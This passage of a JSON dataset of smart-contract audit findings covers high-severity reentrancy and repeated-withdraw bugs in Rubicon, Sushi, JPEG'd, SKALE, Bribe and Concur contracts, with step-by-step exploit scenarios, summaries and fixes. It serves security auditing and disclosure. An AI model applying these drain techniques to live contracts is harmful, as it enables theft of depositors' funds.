`underlyingBalance()`: `100_000e18 XYZ`.\n-   `totalSupply`: `1e18`\n\nThe attacker can create a contracts with `tokensToSend()` function, then:\n\n1.   `deposit(1)`\n    -   preBalance  = `100_000e18`;\n    -   `underlyingToken.transferFrom(msg.sender, address(this), 1)`\n2. reenter using `tokensToSend` hook for the 2nd call: `deposit(1_000e18)`\n    -   preBalance  = `100_000e18`;\n    -   `underlyingToken.transferFrom(msg.sender, address(this), 1_000e18)`\n    -   postBalance = `101_000e18`;\n    -   assets (actualDepositAmount) = `101_000e18 - 100_000e18 = 1_000e18`;\n    -   mint `1000` shares;\n3. continue with the first `deposit()` call:\n    -   `underlyingToken.transferFrom(msg.sender, address(this), 1)`\n    -   postBalance = `101_000e18 + 1`;\n    -   assets (actualDepositAmount) = `(101_000e18 + 1) - 100_000e18 = 1_000e18 + 1`;\n    -   mint `1000` shares;\n\nAs a result, with only `1 + 1_000e18` transferred to the contract, the attacker minted `2_000e18 XYZ` worth of shares.\n\n### Recommendation\n\nConsider adding `nonReentrant` modifier from OZ's `ReentrancyGuard`.",
      "summary": "\nThis bug report is about a vulnerability in the code of the BathToken.sol#_deposit() function, which is part of the 2022-05-rubicon project. This function calculates the amount of funds transferred by comparing the before and after balance, but since there is no reentrancy guard on this function, it is vulnerable to a re-entrancy attack. This attack can be used to mint additional shares in the project.\n\nA proof-of-concept of this attack is provided in the report. It explains how an attacker can use a ERC777 token and the ERC777TokensSender `tokensToSend` hook to re-enter the `deposit()` function and inflate the amount. After transferring only `1 + 1_000e18` to the contract, the attacker can mint `2_000e18 XYZ` worth of shares.\n\nThe report recommends adding the `nonReentrant` modifier from OZ's `ReentrancyGuard` to protect the project from this vulnerability.",
      "report_date": {},
      "contest_prize_txt": "$50,000 USDC",
      "contest_link": "https://code4rena.com/contests/2022-05-rubicon-contest",
      "sponsor_name": "Rubicon",
      "sponsor_link": "https://twitter.com/rubicondefi",
      "quality_score": 4,
      "general_score": 4,
      "source_link": "https://code4rena.com/reports/2022-05-rubicon",
      "github_link": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/350",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "129",
      "slug": "h-10-bathtokensol_deposit-attacker-can-mint-more-shares-with-re-entrancy-from-hookable-tokens-code4rena-rubicon-rubicon-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Rubicon",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Rubicon",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield Aggregator"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "RWA"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        },
        {
          "tags_tag": {
            "title": "ERC777"
          }
        }
      ]
    },
    {
      "id": "19606",
      "kind": "PDF",
      "auditfirm_id": "17",
      "impact": "HIGH",
      "finders_count": 1,
      "protocol_id": "883",
      "title": "Reentrancy Vulnerability Allows Draining All Funds",
      "content": "## Description\n\nA reentrancy vulnerability in the function `stakeToken()` allows an attacker to drain the funds of any ERC20 token deposited in the contract.\n\nIn `stakeToken()` on line [180], `msg.sender`’s liquidity is updated in the state variable `userStakes`, however the incentive’s total liquidity is not updated until line [202]. In between, on line [194], there is a call to `_claimReward()` which passes execution flow back to the token being transferred. Using a malicious token that can react to transfers, such as an ERC777 token, or a custom attack token, the attacker can reenter the contract in between these two lines and interact with the contract in a partially updated state.\n\nIn the partially updated state, `userStake.liquidity` has been increased but the total liquidity of one or more incentives have not been. `userStake.liquidity` is global across all the user’s incentives and is used as a multiplier when rewards are calculated. Therefore, a malicious user may multiply the rewards for unclaimed incentives by an inflated figure and drain tokens.\n\nThe steps taken for this attack are as follows, suppose that there are multiple incentives where USDC is the staking token. Bob is the attacker and has created a malicious token contract, ATT.\n\n1. Bob creates an incentive staking USDC for rewards in ATT.\n2. Bob deposits some USDC into multiple target incentives and also into his ATT incentive. All target incentives must be staking USDC for some other token. It is these other tokens that will be drained. The order of subscriptions is also important. The ATT incentive needs to be first.\n3. Bob waits for some rewards to accumulate.\n4. Bob takes a flash loan of USDC and calls `stakeToken()` to deposit the flash loan with the parameter `transferExistingRewards` as `True`. As the staking contract loops through the incentives that Bob is subscribed to on line [184], it calls the ATT incentive first (as Bob has been careful to subscribe in the correct order for this to happen).\n5. When ATT’s `safeTransfer()` function is called, it passes execution control to Bob, allowing reentrancy. Bob calls `claimRewards()` for the other incentives he is subscribed to. The reward multiplier `usersLiquidity` on line [378] will be out of proportion to the overall liquidity and this can result in the staking contract paying out its entire balance of the reward token.\n6. Bob calls `unstakeToken()` to get back the flash loan and repays it.\n\nA similar reentrancy vulnerability occurs using `_claimReward()` which instead reenters the function `unsubscribeFromIncentive()` and may overflow the unchecked operation on the following line.\n\n```solidity\nunchecked { incentive.liquidityStaked -= userStake.liquidity; }\n```\n\n## Recommendations\n\nThere are two preventive measures that may be taken to mitigate reentrancy:\n\n1. Carefully implement the checks->effects->interaction pattern throughout `StakingContractMainnet`. In particular, make sure that it is not being violated within function calls. This ensures that all external calls are made after state updates.\n   \n2. Use a reentrancy guard, the best known of which is OpenZeppelin’s `ReentrancyGuard`, and apply its modifier `nonReentrant()` on all public and external functions.\n\nThis reentrancy protection will also prevent against the unchecked overflow on line [286]. In that case, consider also removing the unchecked wrapper to allow for overflow protection in the two functions `unsubscribeFromIncentive()` and `unstakeToken()`. The gas increase of using checked math is small for these two variables and the added security significant.\n\n## Resolution\n\nThis issue was resolved by using the Solmate re-entrancy guard. The fix is outlined in PR 1.",
      "summary": "\nA reentrancy vulnerability in the function stakeToken() of the StakingContractMainnet allows an attacker to drain the funds of any ERC20 token deposited in the contract. This is done by using a malicious token that can react to transfers, such as an ERC777 token, or a custom attack token. The attacker creates an incentive staking USDC for rewards in ATT, deposits some USDC into multiple target incentives and also into his ATT incentive, waits for some rewards to accumulate, takes a flash loan of USDC and calls stakeToken() and when ATT’s safeTransfer() function is called, it passes execution control to Bob, allowing reentrancy. Bob calls claimRewards() for the other incentives he is subscribed to and drains the tokens. The same vulnerability also occurs using _claimReward(). \n\nThis issue was resolved by using the Solmate re-entrancy guard and the fix is outlined in PR 1. To prevent such issues from occurring in the future, the checks->effects->interactions pattern should be implemented throughout StakingContractMainnet and the OpenZeppelin’s ReentrancyGuard modifier should be applied to all public and external functions. Additionally, the unchecked wrapper should be removed from the functions unsubscribeFromIncentive() and unstakeToken() to allow for overflow protection.",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "https://github.com/sigp/public-audits/blob/master/sushi/bentobox-strategies-staking-contract/review.pdf",
      "sponsor_name": null,
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://github.com/sigp/public-audits/blob/master/sushi/bentobox-strategies-staking-contract/review.pdf",
      "github_link": "",
      "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/sigmaprime/bentobox-strategies-staking-contract.pdf",
      "pdf_page_from": 7,
      "contest_id": "",
      "slug": "reentrancy-vulnerability-allows-draining-all-funds-sigmaprime-none-sushi-pdf",
      "firm_name": "SigmaPrime",
      "firm_logo_square": "sigmaprime_square.png",
      "protocol_name": "Sushi",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "SigmaPrime",
        "logo_square": "sigmaprime_square.png"
      },
      "protocols_protocol": {
        "name": "Sushi",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield Aggregator"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "1910",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 1,
      "protocol_id": "250",
      "title": "[H-04] Reentrancy issue in yVault.deposit",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L144-L145\n\n\n## Vulnerability details\n\n## Impact\nIn `deposit`, the balance is cached and then a `token.transferFrom` is triggered which can lead to exploits if the `token` is a token that gives control to the sender, like ERC777 tokens.\n\n#### POC\nInitial state: `balance() = 1000`, shares `supply = 1000`.\nDepositing 1000 amount should mint 1000 supply, but one can split the 1000 amounts into two 500 deposits and use re-entrancy to profit.\n\n- Outer `deposit(500)`: `balanceBefore = 1000`. Control is given to attacker ...\n- Inner `deposit(500)`: `balanceBefore = 1000`. `shares = (_amount * supply) / balanceBefore = 500 * 1000 / 1000 = 500` shares are minted ...\n- Outer `deposit(500)` continues with the mint: `shares = (_amount * supply) / balanceBefore = 500 * 1500 / 1000 = 750` are minted.\n- Withdrawing the `500 + 750 = 1250` shares via `withdraw(1250)`, the attacker receives `backingTokens = (balance() * _shares) / supply = 2000 * 1250 / 2250 = 1111.111111111`. The attacker makes a profit of `1111 - 1000 = 111` tokens.\n- They repeat the attack until the vault is drained.\n\n## Recommended Mitigation Steps\nThe `safeTransferFrom` should be the last call in `deposit`.",
      "summary": "\nThis bug report is about an exploit in the yVault contract. When the deposit function is triggered, the balance is cached and then a token.transferFrom is triggered which can lead to exploits if the token is a token that gives control to the sender, like ERC777 tokens. An example of this exploit is if the balance is 1000 and 1000 is deposited, the attacker can split the 1000 into two 500 deposits and use re-entrancy to profit. This would allow them to withdraw 1250 shares and receive 1111.111111111 tokens, which is a profit of 111 tokens. To mitigate this exploit, it is recommended that the safeTransferFrom should be the last call in the deposit function.",
      "report_date": {},
      "contest_prize_txt": "$100,000 USDC",
      "contest_link": "https://code4rena.com/contests/2022-04-jpegd-contest",
      "sponsor_name": "JPEG'd",
      "sponsor_link": "https://twitter.com/jpegd_69",
      "quality_score": 4,
      "general_score": 5,
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/81",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "107",
      "slug": "h-04-reentrancy-issue-in-yvaultdeposit-code4rena-jpegd-jpegd-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "JPEG'd",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "JPEG'd",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Lending"
            },
            "score": 1
          },
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Leveraged Farming"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "1598",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 1,
      "protocol_id": "283",
      "title": "[H-01] Reentrancy in `MessageProxyForSchain` leads to replay attacks",
      "content": "_Submitted by cmichel_\n\nThe `postIncomingMessages` function calls `_callReceiverContract(fromChainHash, messages[i], startingCounter + 1)` which gives control to a contract that is potentially attacker controlled *before* updating the `incomingMessageCounter`.\n\n```solidity\nfor (uint256 i = 0; i < messages.length; i++) {\n    // @audit re-entrant, can submit same postIncomingMessages again\n    _callReceiverContract(fromChainHash, messages[i], startingCounter + 1);\n}\nconnectedChains[fromChainHash].incomingMessageCounter += messages.length;\n```\n\nThe attacker can re-enter into the `postIncomingMessages` function and submit the same messages again, creating a replay attack.\nNote that the `startingCounter` is the way how messages are prevented from replay attacks here, there are no further nonces.\n\n### Proof of Concept\n\nAttacker can submit two cross-chain messages to be executed:\n\n1.  Transfer 1000 USDC\n2.  A call to their attacker-controlled contract, could be masked as a token contract that allows re-entrance on `transfer`.\n\nSome node submits the `postIncomingMessages(params)` transaction, transfers 1000 USDC, then calls the attackers contract, who can themself call `postIncomingMessages(params)` again, receive 1000 USDC a second time, and stop the recursion.\n\n### Recommended Mitigation Steps\n\nAdd a `messageInProgressLocker` modifier to `postIncomingMessages` as was done in `MessageProxyForMainnet`.\n\n**cstrangedk (SKALE) resolved:**\n\nResolved via https://github.com/skalenetwork/IMA/pull/1054\n\n\n***\n\n",
      "summary": "\nThis bug report discusses a vulnerability in the `postIncomingMessages` function of the `MessageProxyForSchain.sol` contract. This function calls `_callReceiverContract(fromChainHash, messages[i], startingCounter + 1)` which gives control to a contract that is potentially attacker-controlled before updating the `incomingMessageCounter`. This allows an attacker to re-enter the `postIncomingMessages` function and submit the same messages again, creating a replay attack. \n\nA proof of concept (POC) is provided to demonstrate the vulnerability. In the POC, the attacker can submit two cross-chain messages to be executed: one to transfer 1000 USDC and one to call their attacker-controlled contract. Some node submits the `postIncomingMessages(params)` transaction, transfers 1000 USDC, then calls the attackers contract, who can then call `postIncomingMessages(params)` again, receive 1000 USDC a second time, and stop the recursion.\n\nThe recommended mitigation step is to add a `messageInProgressLocker` modifier to `postIncomingMessages` as was done in `MessageProxyForMainnet`.",
      "report_date": {},
      "contest_prize_txt": "$125,000 USDC",
      "contest_link": "https://code4rena.com/contests/2022-02-skale-contest",
      "sponsor_name": "SKALE",
      "sponsor_link": "https://twitter.com/SkaleNetwork",
      "quality_score": 3,
      "general_score": 3,
      "source_link": "https://code4rena.com/reports/2022-02-skale",
      "github_link": "https://github.com/code-423n4/2022-02-skale-findings/issues/24",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "88",
      "slug": "h-01-reentrancy-in-messageproxyforschain-leads-to-replay-attacks-code4rena-skale-skale-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "SKALE",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "SKALE",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Launchpad"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Leveraged Farming"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "17726",
      "kind": "PDF",
      "auditfirm_id": "9",
      "impact": "HIGH",
      "finders_count": 3,
      "protocol_id": "779",
      "title": "Reentrancy risks in interactions with bidAsset",
      "content": "## Data Validation\n\n**Type:** Data Validation  \n**Target:** contracts/AavePool.sol  \n\n**Difficulty:** Medium  \n\n## Description  \nThe Bribe Protocol has many reentrancy patterns that may be exploitable if the `bidAsset` ERC20 token is set to an asset with a callback mechanism. Many interactions with the `bidAsset` token do not follow the checks-effects-interactions pattern. If `bidAsset` is set to an asset with a callback mechanism, the failure to use this pattern can lead to exploitable reentrancies.  \n\nFor example, the `_bid` function’s use of the reentrant `safeTransferFrom` function allows the caller to execute a double transfer:\n\n```solidity\n/// @dev place a bid to proposal specified by `proposalId` with `amount` of bid asset\n/// @param proposalId proposal id\n/// @param amount amount of bid asset to bid\nfunction _bid (\n    uint256 proposalId,\n    uint128 amount,\n    bool support\n) internal virtual {\n    require(blockedProposals[proposalId] == false, \"PROPOSAL_BLOCKED\");\n    Bid storage currentBid = bids[proposalId];\n    address prevHighestBidder = currentBid.highestBidder;\n    uint128 currentHighestBid = currentBid.highestBid;\n    uint128 newHighestBid;\n\n    if (prevHighestBidder == address(0)) {\n        uint64 endTime = uint64(getAuctionExpiration(proposalId));\n        currentBid.endTime = endTime;\n    }\n\n    require(currentBid.endTime > block.timestamp, \"BID_ENDED\");\n    // if msg.sender == currentHighestBidder increase the bid amount\n    if (prevHighestBidder == msg.sender) {\n        bidAsset.safeTransferFrom(msg.sender, address(this), amount);\n        newHighestBid = currentHighestBid + amount;\n    } else {\n        require(amount > currentHighestBid, \"LOW_BID\");\n        bidAsset.safeTransferFrom(msg.sender, address(this), amount);\n        // refund to previous highest bidder\n        if (prevHighestBidder != address(0)) {\n            pendingRewardToBeDistributed -= currentHighestBid;\n            bidAsset.safeTransfer(prevHighestBidder, currentHighestBid);\n        }\n        newHighestBid = amount;\n    }\n    // write the new bid info to storage\n    pendingRewardToBeDistributed += amount;\n    currentBid.highestBid = newHighestBid;\n    currentBid.support = support;\n    currentBid.highestBidder = msg.sender;\n    emit HighestBidIncreased(proposalId, prevHighestBidder, msg.sender, newHighestBid);\n}\n```\n\n## Exploit Scenario  \nThe `bidAsset` token is set to an asset with a callback mechanism and deployed. Eve exploits the reentrancy in the `_bid` function to double her profits.\n\n## Recommendations  \n- **Short term:** Either ensure that none of the tokens have callback features, or follow the checks-effects-interactions pattern.  \n- **Long term:** Use Slither to detect reentrancies in the codebase and follow the token integration guidelines provided in Appendix C.  \n\n## References  \n- A series of tweets on the imBTC reentrancy attack.",
      "summary": "\nThis bug report is about a data validation issue in the AavePool.sol contract. It is classified as a medium difficulty issue. The bug is related to reentrancy patterns that may be exploitable if the bidAsset ERC20 token is set to an asset with a callback mechanism. The _bid function's use of the reentrant safeTransferFrom function allows the caller to execute a double transfer. This could be used by an attacker to exploit the reentrancy and double their profits.\n\nTo solve the issue in the short term, the developers should either ensure that none of the tokens have callback features, or follow the checks-effects-interactions pattern. In the long term, they should use Slither to detect reentrancies in the codebase and follow the token integration guidelines in Appendix C. \n\nReferences have also been provided for further reading on the imBTC reentrancy attack.",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "https://github.com/trailofbits/publications/blob/master/reviews/AdvancedBlockchainQ42021.pdf",
      "sponsor_name": "",
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/AdvancedBlockchainQ42021.pdf",
      "github_link": "",
      "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/trailofbits/AdvancedBlockchainQ42021.pdf",
      "pdf_page_from": 57,
      "contest_id": "",
      "slug": "reentrancy-risks-in-interactions-with-bidasset-trailofbits-advanced-blockchain-pdf",
      "firm_name": "TrailOfBits",
      "firm_logo_square": "trailofbits_square.png",
      "protocol_name": "Advanced Blockchain",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "TrailOfBits",
        "logo_square": "trailofbits_square.png"
      },
      "protocols_protocol": {
        "name": "Advanced Blockchain",
        "protocols_protocolcategoryscore": []
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "1402",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 19,
      "protocol_id": "295",
      "title": "[H-03] Repeated Calls to Shelter.withdraw Can Drain All Funds in Shelter",
      "content": "_Submitted by mtz, also found by 0x1f8b, 0xliumin, bitbopper, cccz, cmichel, csanuragjain, Czar102, danb, Alex the Entreprenerd, GeekyLumberjack, gzeon, hickuphh3, hyh, leastwood, Randyyy, Rhynorater, Ruhum, and ShadowyNoobDev_\n\n[Shelter.sol#L52-L57](https://github.com/code-423n4/2022-02-concur/blob/main/contracts/Shelter.sol#L52-L57)<br>\n\ntl;dr Anyone who can call `withdraw` to withdraw their own funds can call it repeatedly to withdraw the funds of others. `withdraw` should only succeed if the user hasn't withdrawn the token already.\n\nThe shelter can be used for users to withdraw funds in the event of an emergency. The `withdraw` function allows callers to withdraw tokens based on the tokens they have deposited into the shelter client: ConvexStakingWrapper. However, `withdraw` does not check if a user has already withdrawn their tokens. Thus a user that can `withdraw` tokens, can call withdraw repeatedly to steal the tokens of others.\n\n### Proof of Concept\n\ntl;dr an attacker that can successfully call `withdraw` once on a shelter, can call it repeatedly to steal the funds of others. Below is a detailed scenario where this situation can be exploited.\n\n1.  Mallory deposits 1 `wETH` into `ConvexStakingWrapper` using [`deposit`](https://github.com/code-423n4/2022-02-concur/blob/shelter-client/contracts/ConvexStakingWrapper.sol#L280). Let's also assume that other users have deposited 2 `wETH` into the same contract.\n2.  An emergency happens and the owner of `ConvexStakingWrapper` calls `setShelter(shelter)` and `enterShelter([pidOfWETHToken, ...])`. Now `shelter` has 3 `wETH` and is activated for `wETH`.\n3.  Mallory calls `shelter.withdraw(wETHAddr, MalloryAddr)`, Mallory will rightfully receive 1 wETH because her share of wETH in the shelter is 1/3.\n4.  Mallory calls `shelter.withdraw(wETHAddr, MalloryAddr)` again, receiving 1/3\\*2 = 2/3 wETH. `withdraw` does not check that she has already withdrawn. This time, the wETH does not belong to her, she has stolen the wETH of the other users. She can continue calling `withdraw` to steal the rest of the funds\n\n### Recommended Mitigation Steps\n\nTo mitigate this, `withdraw` must first check that `msg.sender` has not withdrawn this token before and `withdraw` must also record that `msg.sender` has withdrawn the token.\nThe exact steps for this are below:\n\n1.  Add the following line to the beginning of `withdraw` (line 53):\n\n<!---->\n\n    require(!claimed[_token][msg.sender], \"already claimed\")\n\n2.  Replace [line 55](https://github.com/code-423n4/2022-02-concur/blob/main/contracts/Shelter.sol#L55) with the following:\n\n<!---->\n\n    claimed[_token][msg.sender] = true;\n\nThis replacement is necessary because we want to record who is withdrawing, not where they are sending the token which isn't really useful info.\n\n**[ryuheimat (Concur) confirmed](https://github.com/code-423n4/2022-02-concur-findings/issues/246)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-02-concur-findings/issues/246#issuecomment-1092877228):**\n > The warden has identified a logical fallacy in the `Shelter` contract.\n> \n> This would allow a caller to claim their tokens multiple times, as long as they send them to a new address.\n> \n> Mitigation is as simple as checking claims against `msg.sender`, however because all funds can be drained, this finding is of High Severity.\n\n\n\n***\n\n",
      "summary": "\nA bug was discovered in the shelter contract code that allows users to withdraw tokens from the shelter without properly checking if they have already withdrawn them. This means that a user that can call the `withdraw` function can call it repeatedly to steal the funds of other users.\n\nTo demonstrate this, an example was given where Mallory deposits 1 wETH into the ConvexStakingWrapper contract. Then, the owner of ConvexStakingWrapper calls setShelter and enterShelter to activate the shelter for wETH, which now has 3 wETH. Mallory calls withdraw once, rightfully receiving 1 wETH, and then calls it again, receiving 2/3 wETH, which does not belong to her.\n\nThe recommended mitigation steps are to add a line to the beginning of the `withdraw` function to check that the sender has not already withdrawn the token, and then replace line 55 with a line that records that the sender has withdrawn the token.",
      "report_date": {},
      "contest_prize_txt": "$75,000 USDC",
      "contest_link": "https://code4rena.com/contests/2022-02-concur-finance-contest",
      "sponsor_name": "Concur Finance",
      "sponsor_link": "https://twitter.com/ConcurFinance",
      "quality_score": 3,
      "general_score": 3,
      "source_link": "https://code4rena.com/reports/2022-02-concur",
      "github_link": "https://github.com/code-423n4/2022-02-concur-findings/issues/246",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "83",
      "slug": "h-03-repeated-calls-to-shelterwithdraw-can-drain-all-funds-in-shelter-code4rena-concur-finance-concur-finance-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Concur Finance",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Concur Finance",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Liquid Staking"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Wrong Math"
          }
        },
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        },
        {
          "tags_tag": {
            "title": "Business Logic"
          }
        }
      ]
    },
    {
      "id": "1277",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 16,
      "protocol_id": "315",
      "title": "[H-04] deposit() function is open to reentrancy attacks",
      "content": "_Submitted by jayjonah8, also found by bugwriter001, camden, cccz, cmichel, danb, defsec, Fitraldys, harleythedog, hickuphh3, jayjonah8, kenzo, leastwood, onewayfunction, pedroais, and WatchPug_\n\nIn `Vault.sol` the `deposit()` function is left wide open to reentrancy attacks.  The function eventually calls `\\_createDeposit() => \\_createClaim()` which calls `depositors.mint()` which will then mint an NFT.  When the NFT is minted the sender will receive a callback which can then be used to call the `deposit()` function again before execution is finished.  An attacker can do this minting multiple NFT's for themselves.  `claimers.mint()` is also called in the same function which can also be used to call back into the deposit function before execution is complete.  Since there are several state updates before and after NFT's are minted this can be used to further manipulate the protocol like with `newShares` which is called before minting.  This is not counting what an attacker can do with cross function reentrancy entering into several other protocol functions (like withdraw) before code execution is complete further manipulating the system.\n\n#### Proof of Concept\n\n- <https://github.com/code-423n4/2022-01-sandclock/blob/main/sandclock/contracts/Vault.sol#L160>\n\n- <https://github.com/code-423n4/2022-01-sandclock/blob/main/sandclock/contracts/Vault.sol#L470>\n\n- <https://github.com/code-423n4/2022-01-sandclock/blob/main/sandclock/contracts/Vault.sol#L476>\n\n#### Recommended Mitigation Steps\n\nReentrancy guard modifiers should be placed on the `deposit()`, `withdraw()` and all other important protocol functions to prevent devastating attacks.\n\n**[ryuheimat (Sandclock) confirmed](https://github.com/code-423n4/2022-01-sandclock-findings/issues/3)**\n\n",
      "summary": "\nA user with the handle jayjonah8 has identified a vulnerability in Vault.sol, a smart contract, which could allow an attacker to manipulate the protocol. This vulnerability is due to the deposit() function being left open to reentrancy attacks. This means an attacker can call the deposit() function multiple times before the execution is finished, allowing them to mint multiple NFTs or manipulate the protocol using newShares. To prove their concept, the user provided three links to the source code. To mitigate this vulnerability, reentrancy guard modifiers should be placed on the deposit(), withdraw() and all other important protocol functions. This would prevent an attacker from exploiting this vulnerability.",
      "report_date": {},
      "contest_prize_txt": "$60,000 USDC",
      "contest_link": "https://code4rena.com/contests/2022-01-sandclock-contest",
      "sponsor_name": "Sandclock",
      "sponsor_link": "https://twitter.com/SandclockOrg",
      "quality_score": 2,
      "general_score": 2,
      "source_link": "https://code4rena.com/reports/2022-01-sandclock",
      "github_link": "https://github.com/code-423n4/2022-01-sandclock-findings/issues/3",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "67",
      "slug": "h-04-deposit-function-is-open-to-reentrancy-attacks-code4rena-sandclock-sandclock-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Sandclock",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Sandclock",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield Aggregator"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Staking Pool"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "1275",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 2,
      "protocol_id": "315",
      "title": "[H-02] Withdrawers can get more value returned than expected with reentrant call",
